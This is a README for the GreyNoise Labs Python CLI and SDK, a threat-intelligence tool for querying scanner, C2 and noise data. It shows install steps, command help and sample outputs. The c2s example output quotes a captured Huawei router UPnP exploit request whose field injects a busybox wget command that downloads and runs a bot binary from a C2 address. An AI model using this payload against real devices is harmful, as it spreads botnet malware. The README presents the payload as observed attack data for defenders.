==========================================
Python GreyNoise Labs GraphQL Client & SDK
==========================================

.. image:: https://img.shields.io/badge/License-MIT-yellow.svg
    :target: https://opensource.org/licenses/MIT

This is an abstract python client and SDK library generated from the `GreyNoise Labs API`_ service.

.. _GreyNoise Labs API: https://api.labs.greynoise.io/

Documentation
=============
Documentation is available here: `Documentation <https://api.labs.greynoise.io/1/docs/>_.

CLI Install
===========
1. Run ``python3 -m pip install greynoiselabs``
2. Run ``greynoiselabs init`` to authenticate with Auth0 and save credentials for future use.
3. (Optional) It is recommended to install `jq` to make the CLI output more readable. 
   You can install it with ``brew install jq`` on macOS or ``apt-get install jq`` on Ubuntu.
```
You are not authenticated, would you like to do this now? [y/N]: y
Device code successful
1. Please browse to:  https://greynoise2.auth0.com/activate?user_code=ABCD-EFGH
2. Verify the code matches:  ABCD-EFGH
Please click the link above and follow the instructions...
Please click the link above and follow the instructions...
Please click the link above and follow the instructions...
Token saved to /Users/user/Library/Application Support/greynoiselabs/0.1.19/token.json.
Authentication successful
Aborted.
```

CLI Quick Start
===============
1. To show usage just run ``greynoiselabs`` and you should see this output.
```
Usage: greynoiselabs [OPTIONS] COMMAND [ARGS]...

╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --install-completion          Install completion for the current shell.                                                      │
│ --show-completion             Show completion for the current shell, to copy it or customize the installation.               │
│ --help                        Show this message and exit.                                                                    │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Commands ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ c2s          Return the top 1% of C2s ranked by pervasiveness. This data may be up to 4.5 hours old but covers the previous  │
│              24 hours.                                                                                                       │
│ gengnql      Translate text into usable GreyNoise GNQL queries.                                                              │
│ init         Initialize the client by authenticating with Auth0 and saving the token to a file.                              │
│ knocks       Return the top 1% of Knock results by most recently seen. A Knock represents an IP observed by GreyNoise that   │
│              we have scanned back. This data may be up to 12 hours old. This endpoint supports filtering by a single IP.     │
│ noise-rank   Return the top 1% of ranked IPs by noise score over the previous 7 days of traffic. This also returns the       │
│              pervasiveness and diversity scores. This endpoint supports filtering by a single IP.                            │
│ popular-ips  Return the top 1% of IPs searched in GreyNoise. These results are ordered by the number of users observed over  │
│              the last 7 days. This data may be up to 24 hours old. This also returns the user and request counts. This also  │
│              returns a boolean if this IP was observed by GreyNoise sensors.                                                 │
│ version      Return the version of the GreyNoise Labs CLI.                                                                   │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
2. Run ``greynoiselabs knocks --help`` to show command specific help like below.
```
Usage: greynoiselabs knocks [OPTIONS] [IP]                                                                             
                                                                                                                        
 Return the top 1% of Knock results by most recently seen. A Knock represents an IP observed by GreyNoise that we have  
 scanned back. This data may be up to 12 hours old. This endpoint supports filtering by a single IP.                    
                                                                                                                        
╭─ Arguments ──────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│   ip      [IP]  Specify the IP to retrieve.                                                                          │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --output  -o      TEXT  JSON lines output file location.                                                             │
│ --config  -c      TEXT  Output directory for CLI config.                                                             │
│                         [default: /Users/matt/Library/Application Support/greynoiselabs/0.1.19]                      │
│ --help                  Show this message and exit.                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```
3. Run ``greynoiselabs c2s | jq``
Example Result:
```
{
  "source_ip": "1.2.3.4",
  "hits": 2024,
  "pervasiveness": 10,
  "c2_ips": [
    "5.6.7.8"
  ],
  "c2_domains": [],
  "payload": "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 5.6.7.8 -l /tmp/negro -r /.oKA31/bok.mips; /bin/busybox chmod 777 /tmp/negro; /tmp/negro hw.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
}
```
4. Run ``greynoiselabs knocks | jq``
```
{
  "source_ip": "36.70.32.117",
  "headers": "{\"Content-Type\":[\"text/html\"],\"Expires\":[\"0\"],\"Server\":[\"uc-httpd 1.0.0\"]}",
  "apps": "[{\"app_name\":\"Apache HTTP Server\",\"version\":\"\"}]",
  "emails": [],
  "favicon_mmh3_128": "Sgqu+Vngs9hrQOzD8luitA==",
  "favicon_mmh3_32": -533084183,
  "ips": [
    "10.2.4.88",
    "10.2.2.88"
  ],
  "knock_port": 80,
  "jarm": "00000000000000000000000000000000000000000000000000000000000000",
  "last_seen": "2023-07-21T11:00:06Z",
  "last_crawled": "2023-07-22T00:14:27Z",
  "links": [],
  "title": "NETSurveillance WEB",
  "tor_exit": false
}
```

5. Run ``greynoiselabs popular-ips | jq``
```
{
  "ip": "143.244.50.173",
  "request_count": 916,
  "users_count": 95,
  "last_requested": "2023-07-27T23:55:17Z",
  "noise": true,
  "last_seen": "2023-07-27T23:59:11Z"
}
```
6. Run ``greynoiselabs noise-rank | jq``
```
{
  "ip": "167.94.138.35",
  "noise_score": 89,
  "country_pervasiveness": "very high",
  "payload_diversity": "med",
  "port_diversity": "very high",
  "request_rate": "high",
  "sensor_pervasiveness": "very high"
}
```
7. Run ``greynoiselabs gengnql "Show malicious results that are targeting ukraine from russia"``
Results will differ for `gengnql` on subsequent runs as this is using an GPT prompt.
```
classification:malicious AND metadata.country:Russia AND destination_country:Ukraine
metadata.country:Russia AND destination_country:Ukraine AND classification:malicious
metadata.country_code:RU AND destination_country_code:UA AND classification:malicious
classification:malicious AND metadata.country_code:RU AND destination_country_code:UA
destination_country:Ukraine AND metadata.country:Russia AND classification:malicious
```

CLI Advanced Usage
==================
Show the most popular IPs that are searched at GreyNoise but not observed by our sensors
1. ``greynoiselabs popular-ips | jq '. | select(.noise == false)' | less``

Group the ip's hitting GreyNoise sensors by their HTTP page title
2. ``greynoiselabs knocks | jq -s 'group_by(.title) | map({title: .[0].title, agg: map(.source_ip) })'``

SDK Quick Start
===============
**Install the library**:

``python3 -m pip install greynoiselabs`` or ``make install`` when in the root directory of the repository.

Example SDK Code

You can authenticate to the Labs API and obtain a copy of your token there 
or with the CLI after running `greynoiselabs init`

..  code-block:: python

    import os
    import asyncio
    from greynoiselabs.client import Client

    client = Client("https://api.labs.greynoise.io/1/query",
                    {"Authorization": f"Bearer {os.environ['AUTH_TOKEN']}"})

    response = asyncio.run(client.top_knocks(ip="221.144.229.187"))
    print(response)
